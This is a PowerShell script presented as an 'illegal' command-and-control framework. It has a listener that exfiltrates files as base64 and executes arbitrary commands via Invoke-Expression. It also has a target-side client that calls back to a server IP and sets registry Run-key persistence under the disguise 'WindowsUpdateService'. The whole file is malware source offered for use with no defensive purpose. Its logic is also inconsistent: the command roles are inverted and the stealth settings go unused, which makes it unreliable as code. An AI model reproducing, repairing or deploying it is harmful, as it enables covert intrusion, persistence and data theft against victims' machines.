# DarkC2 - Custom Command-and-Control Framework in PowerShell
# Stealthy, illegal remote control with anti-forensic features

# C2 Server
function Start-C2Server {
    param (
        [string]$ListenIp = "0.0.0.0",
        [int]$Port = 6666,
        [string]$DataDir = "$env:APPDATA\DarkC2"
    )

    # Setup data directory for logs and exfiltrated data
    New-Item -Path $DataDir -ItemType Directory -Force | Out-Null
    $clientSessions = @{}

    # Start TCP listener
    $listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Parse($ListenIp), $Port)
    $listener.Start()
    Write-Host "Boss, C2 server live on ${ListenIp}:${Port}. Ready to dominate."

    while ($true) {
        $client = $listener.AcceptTcpClient()
        $clientId = [System.Guid]::NewGuid().ToString()
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        # Register client
        $clientSessions[$clientId] = @{
            Client = $client
            Stream = $stream
            Writer = $writer
            Reader = $reader
        }

        # Handle client in separate runspace
        $runspace = [PowerShell]::Create()
        $runspace.AddScript({
            param ($clientId, $client, $stream, $reader, $writer, $DataDir)

            # Anti-forensic: Randomize process name
            $fakeProcName = "svchost_$([System.Guid]::NewGuid().ToString().Substring(0,8))"
            $logFile = "$DataDir\$clientId.log"

            while ($client.Connected) {
                try {
                    $command = $reader.ReadLine()
                    if ($command -eq "EXIT") { break }

                    # Process commands
                    switch ($command) {
                        "WHOAMI" {
                            $writer.WriteLine($(whoami))
                        }
                        "EXFIL" {
                            $filePath = $reader.ReadLine()
                            if (Test-Path $filePath) {
                                $data = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($filePath))
                                $writer.WriteLine($data)
                            } else {
                                $writer.WriteLine("ERROR: File not found")
                            }
                        }
                        "CMD" {
                            $cmd = $reader.ReadLine()
                            try {
                                $output = Invoke-Expression $cmd 2>&1 | Out-String
                                $writer.WriteLine($output)
                            } catch {
                                $writer.WriteLine("ERROR: $_")
                            }
                        }
                        default {
                            $writer.WriteLine("Unknown command")
                        }
                    }

                    # Log activity
                    Add-Content -Path $logFile -Value "[$(Get-Date)] $command"
                } catch {
                    break
                }
            }

            # Cleanup
            $stream.Close()
            $client.Close()
        }).AddArgument($clientId).AddArgument($client).AddArgument($stream).AddArgument($reader).AddArgument($writer).AddArgument($DataDir)

        $runspace.BeginInvoke() | Out-Null
    }
}

# C2 Client (to be deployed on target)
function Start-C2Client {
    param (
        [string]$ServerIp = "192.168.1.100", # Replace with C2 server IP
        [int]$Port = 6666
    )

    # Stealth: Hide process
    $procAttr = New-Object System.Diagnostics.ProcessStartInfo
    $procAttr.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden

    # Connect to C2 server
    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $client.Connect($ServerIp, $Port)
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        # Persistence: Add to registry
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "WindowsUpdateService"
        $regValue = "powershell -WindowStyle Hidden -Command `"& '$PSCommandPath'`""
        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force

        # Main loop
        while ($client.Connected) {
            $writer.WriteLine("CMD")
            $writer.WriteLine("whoami")
            $response = $reader.ReadLine()
            Start-Sleep -Seconds 5
        }
    } catch {
        # Retry connection after delay
        Start-Sleep -Seconds 30
        Start-C2Client -ServerIp $ServerIp -Port $Port
    } finally {
        $stream.Close()
        $client.Close()
    }
}

# Main execution
if ($args[0] -eq "client") {
    Start-C2Client
} else {
    Start-C2Server
}